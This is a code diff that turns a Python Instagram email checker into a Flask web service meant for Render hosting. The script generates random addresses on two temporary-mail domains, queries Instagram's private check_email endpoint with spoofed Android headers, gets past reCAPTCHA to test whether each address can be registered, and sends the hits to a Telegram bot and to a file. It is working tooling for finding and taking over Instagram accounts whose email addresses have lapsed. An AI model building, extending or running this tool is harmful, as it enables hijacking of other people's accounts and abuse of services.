@@ -8,57 +8,79 @@ from threading import Thread, Lock
 import subprocess
 import uuid
 import json
+import logging
+from flask import Flask, request, jsonify
 
-# Ensure required libraries are imported
-try:
-    import h2
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
+# Setup logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-try:
-    import httpx
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "httpx[http2]"])
-    import httpx  
+# Install dependencies if needed
+def install_dependencies():
+    try:
+        import h2
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
+    
+    try:
+        import httpx
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "httpx[http2]"])
+        import httpx
+    
+    try:
+        from cfonts import render
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests telethon pyfiglet rich cfonts bs4"])
+        from cfonts import render
 
-try:
-    from cfonts import render
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests telethon pyfiglet rich cfonts bs4"])
-    from cfonts import render
+install_dependencies()
 
-# Terminal Colors
-YELLOW = '\033[1;33m' 
-F = '\033[2;32m' 
+# Create Flask app for web service
+app = Flask(__name__)
+
+# Colors and formatting
+b = random.randint(5,208)
+bo = f'\x1b[38;5;{b}m'
 ED = '\x1b[38;5;208m'
-R = "\033[1;31m" 
+BLUE = '\033[94m'
+Z = '\033[1;31m' 
+YELLOW = '\033[1;33m' 
+O = '\033[2;31m' 
+F = '\033[2;32m' 
+A = '\033[2;34m'
+C = '\033[2;35m' 
 M = '\033[2;36m'
 Y = '\033[1;34m' 
+B = "\033[1;30m" 
+R = "\033[1;31m" 
+G = "\033[1;32m" 
+W = "\033[1;37m" 
 J = '\033[2;36m'
 N = '\033[1;37m'
 
-def banner():
-    print(f'''{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
- {N}DEV / @aaeerts{J}|
-{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
-''')
-banner()
-
-# Fetch inputs from Render Environment Variables
-token = os.environ.get("BOT_TOKEN")
-ID = os.environ.get("CHAT_ID")
-
-if not token or not ID:
-    print("Error: BOT_TOKEN or CHAT_ID environment variables are not set!")
-    sys.exit(1)
-
-# Global Variables
+# Global variables
 used_usernames = set()
 lock = Lock()
 hit = 0
 badig = 0
 badmil = 0
 dead = 0
+is_running = False
+
+def banner():
+    banner_text = f'''{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
+{N}DEV / @sm4ss {J}|
+{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
+'''
+    logger.info(banner_text)
+
+# Get token from environment variable
+TOKEN = os.environ.get('BOT_TOKEN', '')
+CHAT_ID = os.environ.get('CHAT_ID', '')
+
+if not TOKEN or not CHAT_ID:
+    logger.warning("BOT_TOKEN or CHAT_ID not set. Some features will be disabled.")
 
 def generate_android_ua():
     devices = [
@@ -91,14 +113,16 @@ def info(user):
 ⌦ [ {dom} ] 
 ✺ Email: {user}
 ╚───────────────╝
+By || @sm4ss
 '''
     try:
-        with open('hits1.txt', 'a') as ff:
+        with open('hits.txt', 'a') as ff:
             ff.write(f'{msg}\n')
-        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}", timeout=10)
+        if TOKEN and CHAT_ID:
+            requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
     except Exception as e:
-        pass            
-        	           
+        logger.error(f"Error sending message: {e}")
+
 def solve_recaptcha():
     try:
         anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=ar&v=TnA7HacJFoBWt9hnlunBlYfK&size=invisible&anchor-ms=20000&execute-ms=30000&cb=x552vg5lfo2g"
@@ -136,11 +160,12 @@ def solve_recaptcha():
             "X-Client-Data": "CN2OywE="
         }
         
-        resp = requests.post('https://www.google.com/recaptcha/api2/reload', data=payload, headers=headers)
+        resp = requests.post('https://www.google.com/recaptcha/api2/reload', data=payload, headers=reload_headers)
         if 'resp","' in resp.text:
             return resp.text.split('resp","')[1].split('"')[0]
         return None
-    except:
+    except Exception as e:
+        logger.error(f"Recaptcha error: {e}")
         return None
 
 def check_email(email):
@@ -170,21 +195,19 @@ def check_email(email):
         'authorization': "Basic bnVsbA==",
     }
     try:
-        response = requests.post("https://hi2.in/api/custom", data=data, headers=headers, timeout=10)
+        response = requests.post("https://hi2.in/api/custom", data=data, headers=headers, timeout=30)
         res = response.json()
         if "already taken" in str(res) or res.get('status') == 'error':
             badmil += 1
         else:
             info(user)    	
-    except:
+    except Exception as e:
+        logger.error(f"Check email error: {e}")
         badmil += 1
 
 def rest(email):
-    global hit, badig, badmil, dead
+    global bad_user, hit, badig, badmil, dead
     try:
-        # Logging to console cleanly without clearing terminal
-        print(f"Hits: {hit} | BadMail: {badmil} | BadIG: {badig} | Dead: {dead} | Testing: {email}")
-        
         url = "https://i.instagram.com/api/v1/users/check_email/"
         id_data = str(uuid.uuid4())
         
@@ -203,7 +226,7 @@ def rest(email):
             'X-IG-App-ID': '936619743392459'
         }
         
-        with httpx.Client(http2=True, timeout=10) as client:
+        with httpx.Client(http2=True, timeout=30.0) as client:
             response = client.post(url, data=payload, headers=headers)
             
             if 'email_is_taken' in response.text:
@@ -212,10 +235,11 @@ def rest(email):
                 badig += 1
                 
     except Exception as e:
+        logger.error(f"Rest error: {e}")
         dead += 1
 
 def users():    
-    while True:
+    while is_running:
         user1 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5))
         user2 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
         chosen_user = random.choice([user1, user2])
@@ -228,12 +252,65 @@ def users():
         chos = random.choice(["@hi2.in", "@telegmail.com"])
         email = chosen_user + chos
         rest(email)
-        time.sleep(0.5)  # Added brief delay to avoid instant CPU spin-lock
+        
+        # Add small delay to avoid rate limiting
+        time.sleep(0.5)
 
-# Start threads
-for _ in range(10):
-    Thread(target=users, daemon=True).start()
+@app.route('/')
+def home():
+    return jsonify({
+        "status": "running",
+        "hits": hit,
+        "bad_ig": badig,
+        "bad_mail": badmil,
+        "dead": dead,
+        "total_checked": hit + badig + badmil + dead,
+        "is_running": is_running
+    })
 
-# Keep main thread alive
-while True:
-    time.sleep(1)
+@app.route('/start')
+def start():
+    global is_running
+    if not is_running:
+        is_running = True
+        # Start threads
+        for _ in range(5):  # Reduced threads for Render free tier
+            Thread(target=users, daemon=True).start()
+        return jsonify({"status": "started"})
+    return jsonify({"status": "already running"})
+
+@app.route('/stop')
+def stop():
+    global is_running
+    is_running = False
+    return jsonify({"status": "stopped"})
+
+@app.route('/stats')
+def stats():
+    return jsonify({
+        "hits": hit,
+        "bad_ig": badig,
+        "bad_mail": badmil,
+        "dead": dead,
+        "total_checked": hit + badig + badmil + dead
+    })
+
+if __name__ == "__main__":
+    banner()
+    
+    # Try to get token from environment variables
+    if TOKEN and CHAT_ID:
+        logger.info(f"Bot configured with token: {TOKEN[:10]}...")
+    else:
+        logger.warning("Bot token or chat ID not configured. Running with limited functionality.")
+    
+    # Auto-start on Render
+    if os.environ.get('RENDER'):
+        logger.info("Running on Render - Auto-starting checker...")
+        is_running = True
+        for _ in range(5):
+            Thread(target=users, daemon=True).start()
+    
+    # Start Flask app
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
